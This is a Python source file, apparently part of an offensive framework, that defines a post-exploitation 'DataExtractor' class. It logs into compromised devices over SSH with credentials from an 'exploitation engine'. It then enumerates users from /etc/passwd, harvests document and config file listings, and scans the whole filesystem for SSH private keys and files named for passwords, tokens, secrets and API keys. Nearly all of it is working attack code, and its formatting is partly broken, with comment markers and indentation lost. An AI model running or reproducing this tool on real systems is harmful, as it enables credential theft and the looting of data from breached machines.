#!/usr/bin/env python3
"""
Data Extraction Module
Handles the extraction of sensitive data from compromised devices.
Author: Independent Red Team Consultant
Classification: Professional Use Only
"""
import asyncio
import paramiko
import re
import os
import logging
from typing import List, Dict, Optional, Tuple, Set
from pathlib import Path
import json
Configure logging
logging.basicConfig(
level=logging.INFO,
format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('DataExtractor')
class DataExtractor:
"""
Handles the extraction of sensitive data from compromised devices via SSH.
"""
def __init__(self, ssh_access: Dict):
    """
    Initialize the data extractor with SSH access details.
    
    Args:
        ssh_access (Dict): Dictionary containing SSH access details from the exploitation engine.
                         Expected keys: 'ip', 'username', 'password', 'port'.
    """
    self.ssh_access = ssh_access
    self.ssh_client = None
    self.connect()

def connect(self) -> bool:
    """
    Establish an SSH connection to the target device.
    
    Returns:
        bool: True if connection successful, False otherwise.
    """
    try:
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh_client.connect(
            self.ssh_access['ip'],
            port=self.ssh_access.get('port', 22),
            username=self.ssh_access['username'],
            password=self.ssh_access['password'],
            timeout=10
        )
        logger.info(f"SSH connection established to {self.ssh_access['ip']}")
        return True
    except Exception as e:
        logger.error(f"Failed to connect via SSH: {e}")
        return False

def execute_command(self, command: str) -> Tuple[str, str, int]:
    """
    Execute a command on the remote device.
    
    Args:
        command (str): The command to execute.
        
    Returns:
        Tuple: (stdout, stderr, exit_code)
    """
    if not self.ssh_client:
        logger.error("SSH client not connected.")
        return "", "", 1
        
    try:
        stdin, stdout, stderr = self.ssh_client.exec_command(command)
        exit_status = stdout.channel.recv_exit_status()
        stdout_str = stdout.read().decode('utf-8', errors='ignore')
        stderr_str = stderr.read().decode('utf-8', errors='ignore')
        return stdout_str, stderr_str, exit_status
    except Exception as e:
        logger.error(f"Error executing command '{command}': {e}")
        return "", str(e), 1

def get_system_info(self) -> Dict:
    """
    Extract basic system information.
    
    Returns:
        Dict: System information.
    """
    info = {}
    
    # Get hostname
    stdout, _, _ = self.execute_command('hostname')
    info['hostname'] = stdout.strip()
    
    # Get OS information
    stdout, _, _ = self.execute_command('uname -a')
    info['os_info'] = stdout.strip()
    
    # Get list of users
    stdout, _, _ = self.execute_command('cat /etc/passwd | cut -d: -f1')
    info['users'] = [user.strip() for user in stdout.split('\n') if user.strip()]
    
    # Get installed packages (common for Linux)
    stdout, _, _ = self.execute_command('dpkg -l 2>/dev/null || rpm -qa 2>/dev/null || echo "Unknown package manager"')
    info['installed_packages'] = stdout.strip()
    
    logger.info(f"Extracted system info for {self.ssh_access['ip']}")
    return info

def search_files(self, search_paths: List[str] = None, extensions: List[str] = None) -> List[Dict]:
    """
    Search for files with specific extensions in given paths.
    
    Args:
        search_paths (List[str]): Directories to search. Defaults to common sensitive locations.
        extensions (List[str]): File extensions to look for.
        
    Returns:
        List[Dict]: List of found files with their paths and metadata.
    """
    if not search_paths:
        search_paths = ['/home', '/root', '/etc', '/var/www', '/srv']
    if not extensions:
        extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.db', '.sql', '.json', '.xml', '.conf', '.ini', '.log']
    
    found_files = []
    
    for path in search_paths:
        # Use find command for efficient searching
        find_cmd = f"find {path} -type f \\( {' -o -name \'*'.join(extensions)} \\) 2>/dev/null"
        stdout, _, _ = self.execute_command(find_cmd)
        
        for file_path in stdout.split('\n'):
            if file_path.strip():
                try:
                    # Get file metadata
                    stat_cmd = f"stat -c '%s %n' '{file_path.strip()}'"
                    stat_out, _, _ = self.execute_command(stat_cmd)
                    size, full_path = stat_out.strip().split(' ', 1)
                    
                    found_files.append({
                        'path': full_path,
                        'size': int(size),
                        'extension': Path(full_path).suffix,
                        'directory': str(Path(full_path).parent)
                    })
                except Exception as e:
                    logger.debug(f"Error getting metadata for {file_path}: {e}")
    
    logger.info(f"Found {len(found_files)} files on {self.ssh_access['ip']}")
    return found_files

def extract_credentials(self) -> Dict:
    """
    Search for potential credentials in common locations.
    
    Returns:
        Dict: Dictionary of found credentials categorized by type.
    """
    credentials = {
        'ssh_keys': [],
        'password_files': [],
        'config_files': [],
        'database_files': []
    }
    
    # Search for SSH keys
    stdout, _, _ = self.execute_command('find / -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" 2>/dev/null')
    for key_path in stdout.split('\n'):
        if key_path.strip():
            credentials['ssh_keys'].append(key_path.strip())
    
    # Search for password files and config files
    sensitive_patterns = [
        'password', 'pass', 'cred', 'secret', 'key', 'token', 'api_key', 'db', 'database'
    ]
    search_cmd = f"find / -type f \\( {' -o -name \'*'.join(sensitive_patterns)} \\) 2>/dev/null"
    stdout, _, _ = self.execute_command(search_cmd)
    
    for file_path in stdout.split('\n'):
        if file_path.strip():
            file_name = Path(file_path.strip()).name.lower()
            if any(ext in file_name for ext in ['.db', '.sql', '.sqlite']):
                credentials['database_files'].append(file_path.strip())
            elif any(ext in file_name for ext in ['.conf', '.ini', '.json', '.xml', '.yaml', '.yml']):
                credentials['config_files'].append(file_path.strip())
            else:
                credentials['password_files'].append(file_path.strip())
    
    logger.info(f"Extracted credential info from {self.ssh_access['ip']}")
    return credentials

def extract_sensitive_data(self) -> Dict:
    """
    Main method to orchestrate data extraction.
    
    Returns:
        Dict: All extracted data categorized.
    """
    if not self.ssh_client:
        logger.error("Cannot extract data, SSH client not connected.")
        return {}
        
    extracted_data = {
        'system_info': self.get_system_info(),
        'files': self.search_files(),
        'credentials': self.extract_credentials()
    }
    
    logger.info(f"Data extraction complete for {self.ssh_access['ip']}")
    return extracted_data

def close(self):
    """Close the SSH connection."""
    if self.ssh_client:
        self.ssh_client.close()
        logger.info(f"SSH connection to {self.ssh_access['ip']} closed.")
        self.ssh_client = None

Example usage (for testing purposes only)
if name == "main":
# This part should be integrated into the main framework's async loop.
# For standalone testing, we can run it directly with mock data.
ssh_access_example = {
'ip': '192.168.1.100',  # Replace with a test IP you have permission to scan
'username': 'testuser',
'password': 'testpassword',
'port': 22
}
extractor = DataExtractor(ssh_access_example)
if extractor.connect():
    data = extractor.extract_sensitive_data()
    print("Extracted Data:")
    print(json.dumps(data, indent=2))
    extractor.close()
else:
    print("Failed to connect.")

